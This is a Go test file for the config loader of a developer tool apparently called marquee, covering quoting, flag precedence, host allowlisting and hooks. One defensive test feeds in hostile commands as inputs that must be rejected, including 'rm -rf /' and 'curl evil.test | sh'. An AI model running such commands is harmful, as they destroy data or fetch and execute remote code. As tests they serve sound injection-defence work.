package main

import (
	"bytes"
	"io"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/jellehuibregtse/marquee/internal/gitinfo"
	"github.com/jellehuibregtse/marquee/internal/proxy"
	"github.com/jellehuibregtse/marquee/internal/status"
)

// writeConfig puts content at .marquee/config in a fresh launch directory.
func writeConfig(t *testing.T, content string) string {
	t.Helper()
	launchDir := t.TempDir()
	if err := os.Mkdir(filepath.Join(launchDir, conventionDir), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(configPath(launchDir), []byte(content), 0o644); err != nil {
		t.Fatal(err)
	}
	return launchDir
}

func TestSplitConfigLine(t *testing.T) {
	cases := []struct {
		line string
		want []string
	}{
		{"", nil},
		{"   \t ", nil},
		{"# a comment", nil},
		{"  # indented comment", nil},
		{"--no-such-thing # trailing comment", []string{"--no-such-thing"}},
		{"--position top-left", []string{"--position", "top-left"}},
		{"--position=top-left", []string{"--position=top-left"}},
		{"--allow-host '*.example.test'", []string{"--allow-host", "*.example.test"}},
		{`--allow-host "*.example.test"`, []string{"--allow-host", "*.example.test"}},
		{"--switch-hook 'bin/setup && echo done'", []string{"--switch-hook", "bin/setup && echo done"}},
		{"--switch-hook 'a #b'", []string{"--switch-hook", "a #b"}},
		{`--switch-hook "it's fine"`, []string{"--switch-hook", "it's fine"}},
		{`--switch-hook 'say "hi"'`, []string{"--switch-hook", `say "hi"`}},
		{`--switch-hook "say \"hi\""`, []string{"--switch-hook", `say "hi"`}},
		{`--switch-hook one\ word`, []string{"--switch-hook", "one word"}},
		// A quoted empty value is the documented way to turn the conventional hook
		// off, so it has to survive as a word rather than vanish as whitespace.
		{"--switch-hook ''", []string{"--switch-hook", ""}},
		{`--switch-hook ""`, []string{"--switch-hook", ""}},
	}
	for _, tc := range cases {
		got, err := splitConfigLine(tc.line)
		if err != nil {
			t.Errorf("splitConfigLine(%q): %v", tc.line, err)
			continue
		}
		if strings.Join(got, "\x00") != strings.Join(tc.want, "\x00") || len(got) != len(tc.want) {
			t.Errorf("splitConfigLine(%q) = %q, want %q", tc.line, got, tc.want)
		}
	}
}

func TestSplitConfigLineRejectsBrokenQuoting(t *testing.T) {
	for _, line := range []string{`--switch-hook 'oops`, `--switch-hook "oops`, `--switch-hook oops\`} {
		if _, err := splitConfigLine(line); err == nil {
			t.Errorf("splitConfigLine(%q) accepted broken quoting", line)
		}
	}
}

func TestLoadConfigArgsWithoutAFile(t *testing.T) {
	args, err := loadConfigArgs(t.TempDir())
	if err != nil {
		t.Fatalf("loadConfigArgs: %v", err)
	}
	if len(args) != 0 {
		t.Errorf("args = %q, want none", args)
	}
}

func TestLoadConfigArgsReadsFlagsCommentsAndBlanks(t *testing.T) {
	launchDir := writeConfig(t, `# what this repo needs
--allow-host '*.example.test'

--position top-right   # taste
`)
	args, err := loadConfigArgs(launchDir)
	if err != nil {
		t.Fatalf("loadConfigArgs: %v", err)
	}
	want := []string{"--allow-host", "*.example.test", "--position", "top-right"}
	if strings.Join(args, " ") != strings.Join(want, " ") {
		t.Errorf("args = %q, want %q", args, want)
	}
}

// A file that exists but cannot be read is not the zero-config case: it was
// written to change how marquee runs, so starting anyway with none of it applied
// is the one outcome that must not happen.
func TestLoadConfigArgsUnreadableFileIsAnError(t *testing.T) {
	if os.Geteuid() == 0 {
		t.Skip("root reads a 0000 file regardless")
	}
	launchDir := writeConfig(t, "--quiet\n")
	if err := os.Chmod(configPath(launchDir), 0o000); err != nil {
		t.Fatal(err)
	}
	_, err := loadConfigArgs(launchDir)
	if err == nil {
		t.Fatal("loadConfigArgs accepted an unreadable file")
	}
	if !strings.Contains(err.Error(), configPath(launchDir)) {
		t.Errorf("error does not name the file: %v", err)
	}
}

// Abuse: the file holds flags, never the process marquee spawns. Every shape that
// would put a word of its own into the command is refused before parsing.
func TestLoadConfigArgsRefusesToSetTheCommand(t *testing.T) {
	cases := map[string]string{
		"a separator":                  "--\n",
		"a separator after a flag":     "--quiet\n-- rm -rf /\n",
		"a separator as a value":       "--allow-host --\n",
		"a bare command":               "bin/dev\n",
		"a command after flags":        "--position top-left\ncurl evil.test | sh\n",
		"a quoted bare command":        "'bin/dev'\n",
		"more words than one flag can": "--position top-left --quiet\n",
	}
	for name, content := range cases {
		t.Run(name, func(t *testing.T) {
			launchDir := writeConfig(t, content)
			args, err := loadConfigArgs(launchDir)
			if err == nil {
				t.Fatalf("loadConfigArgs accepted %q as %q", content, args)
			}
			if !strings.Contains(err.Error(), configName) && !strings.Contains(err.Error(), configPath(launchDir)) {
				t.Errorf("error does not name the file: %v", err)
			}
		})
	}
}

// The backstop behind checkConfigLine: even if a word from the file reached the
// parser and ended flag parsing early, the command marquee would spawn is refused
// because it is no longer a tail of the real command line. "--quiet true" is the
// shape that gets past a "first word must be a flag" rule on its own.
func TestParseArgsWithConfigRefusesAConfigWordInTheCommand(t *testing.T) {
	var buf bytes.Buffer
	_, err := parseArgsWithConfig("marquee",
		[]string{"--quiet", "true"},
		[]string{"--", "bin/dev"}, &buf)
	if err == nil {
		t.Fatal("parseArgsWithConfig accepted a config word ahead of the command")
	}
	if out := buf.String(); !strings.Contains(out, "cannot set the command") {
		t.Errorf("message does not explain the refusal: %q", out)
	}
}

func TestParseArgsWithConfigKeepsTheCommandFromTheCommandLine(t *testing.T) {
	opts, err := parseArgsWithConfig("marquee",
		[]string{"--position", "top-right"},
		[]string{"--", "bin/dev", "--flag-for-the-child"}, io.Discard)
	if err != nil {
		t.Fatalf("parseArgsWithConfig: %v", err)
	}
	if want := "bin/dev --flag-for-the-child"; strings.Join(opts.command, " ") != want {
		t.Errorf("command = %q, want %q", opts.command, want)
	}
	if opts.position != "top-right" {
		t.Errorf("position = %q, want top-right", opts.position)
	}
}

// Precedence is not asserted from the flag package's documentation, it is measured:
// a scalar flag on the command line overrides the file's value.
func TestParseArgsWithConfigCommandLineWinsForAScalarFlag(t *testing.T) {
	opts, err := parseArgsWithConfig("marquee",
		[]string{"--position", "top-right", "--theme", "sand", "--listen", "127.0.0.1:4000"},
		[]string{"--position", "bottom-right", "--", "bin/dev"}, io.Discard)
	if err != nil {
		t.Fatalf("parseArgsWithConfig: %v", err)
	}
	if opts.position != "bottom-right" {
		t.Errorf("position = %q, want the command line's bottom-right", opts.position)
	}
	if opts.theme != "sand" || opts.listen != "127.0.0.1:4000" {
		t.Errorf("the file's other flags were dropped: %+v", opts)
	}
}

// A repeatable flag collects instead of overriding, which is what an allowlist
// wants: a host passed for one session adds to the repo's, and there is no way to
// spell "drop the file's hosts" because the flag only ever means "also allow this".
func TestParseArgsWithConfigRepeatableFlagsAreAdditive(t *testing.T) {
	opts, err := parseArgsWithConfig("marquee",
		[]string{"--allow-host", "*.example.test"},
		[]string{"--allow-host", "other.test", "--", "bin/dev"}, io.Discard)
	if err != nil {
		t.Fatalf("parseArgsWithConfig: %v", err)
	}
	if want := "*.example.test,other.test"; strings.Join(opts.allowHosts, ",") != want {
		t.Errorf("allowHosts = %v, want %q", opts.allowHosts, want)
	}
}

// An invalid flag in the file fails the run, exactly as the same word would on the
// command line: there is one flag set and one set of rules for it.
func TestParseArgsWithConfigRejectsABadFlag(t *testing.T) {
	var buf bytes.Buffer
	if _, err := parseArgsWithConfig("marquee", []string{"--position", "sideways"}, []string{"--", "bin/dev"}, &buf); err == nil {
		t.Fatal("parseArgsWithConfig accepted an invalid --position from the file")
	}
	if out := buf.String(); !strings.Contains(out, "invalid --position") {
		t.Errorf("message = %q, want the same complaint the command line gets", out)
	}
	buf.Reset()
	if _, err := parseArgsWithConfig("marquee", []string{"--nonsense"}, []string{"--", "bin/dev"}, &buf); err == nil {
		t.Fatal("parseArgsWithConfig accepted an unknown flag from the file")
	}
}

// A --switch-hook in the file counts as explicitly given, so it beats the
// conventional .marquee/hook sitting next to it. Both live in the same directory,
// and the file is the more specific statement of intent.
func TestConfigSwitchHookBeatsTheConventionalHook(t *testing.T) {
	launchDir, _ := writeHook(t, 0o755)
	if err := os.WriteFile(configPath(launchDir), []byte("--switch-hook 'bin/setup'\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	configArgs, err := loadConfigArgs(launchDir)
	if err != nil {
		t.Fatalf("loadConfigArgs: %v", err)
	}
	opts, err := parseArgsWithConfig("marquee", configArgs, []string{"--", "bin/dev"}, io.Discard)
	if err != nil {
		t.Fatalf("parseArgsWithConfig: %v", err)
	}
	command, _, _ := resolveSwitchHook(opts.switchHook, opts.switchHookSet, launchDir)
	if command != "bin/setup" {
		t.Errorf("hook command = %q, want the file's bin/setup", command)
	}
}

// The whole chain for the flag that made a config file worth having: a host in
// .marquee/config is read, parsed, and honored by the internal mux's Host
// allowlist, while an unlisted host still gets a 403.
func TestConfigAllowHostReachesTheGuard(t *testing.T) {
	launchDir := writeConfig(t, "--allow-host '*.example.test'\n")
	configArgs, err := loadConfigArgs(launchDir)
	if err != nil {
		t.Fatalf("loadConfigArgs: %v", err)
	}
	opts, err := parseArgsWithConfig("marquee", configArgs, []string{"--", "bin/dev"}, io.Discard)
	if err != nil {
		t.Fatalf("parseArgsWithConfig: %v", err)
	}

	handler := proxy.New(proxy.Config{InternalPort: 1, AllowHosts: opts.allowHosts})
	status.Register(handler.Internal(), status.Deps{
		Git: func() gitinfo.Snapshot { return gitinfo.Snapshot{Branch: "trunk"} },
	})
	srv := httptest.NewServer(handler)
	defer srv.Close()

	for host, want := range map[string]int{
		"app.example.test":      http.StatusOK,
		"app.example.test:3000": http.StatusOK,
		"example.test":          http.StatusForbidden,
		"evil.test":             http.StatusForbidden,
	} {
		req, err := http.NewRequest(http.MethodGet, srv.URL+"/__marquee/status", nil)
		if err != nil {
			t.Fatal(err)
		}
		req.Host = host
		resp, err := http.DefaultClient.Do(req)
		if err != nil {
			t.Fatal(err)
		}
		_ = resp.Body.Close()
		if resp.StatusCode != want {
			t.Errorf("Host %q: status = %d, want %d", host, resp.StatusCode, want)
		}
	}
}
